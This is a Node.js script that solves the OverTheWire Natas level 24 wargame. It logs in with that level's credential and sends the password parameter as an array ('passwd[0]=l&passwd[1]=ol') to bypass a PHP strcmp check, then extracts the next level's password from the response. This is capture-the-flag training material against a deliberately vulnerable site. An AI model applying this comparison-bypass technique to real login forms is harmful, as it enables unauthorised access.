const http = require('http');
const querystring = require('querystring');

const options = {
  base: () => ({
    auth: 'natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: `PHPSESSID=nickontheweb`,
    },
    hostname: 'natas24.natas.labs.overthewire.org',
    port: 80,
  }),
  get: query => ({
    ...options.base(),
    method: 'GET',
    path: `/index.php${query}`,
  }),
};

const get = (opts = options.get()) =>
  new Promise((resolve, reject) =>
    http
      .request(opts, res => {
        let body = '';
        res.on('data', data => (body = body + data));
        res.on('end', () => resolve(body));
      })
      .on('error', reject)
      .end(),
  );

get(options.get('?passwd[0]=l&passwd[1]=ol')).then(body => {
  const wasAuthed = body.match(/Password/);

  wasAuthed ? console.log('Success!') : console.log('Failure!');
  if (!wasAuthed) return;

  const regex = /(Password: [a-zA-Z0-9]{32})<\/pre>/;
  const password = body.match(regex)[1];

  console.log(password);
});
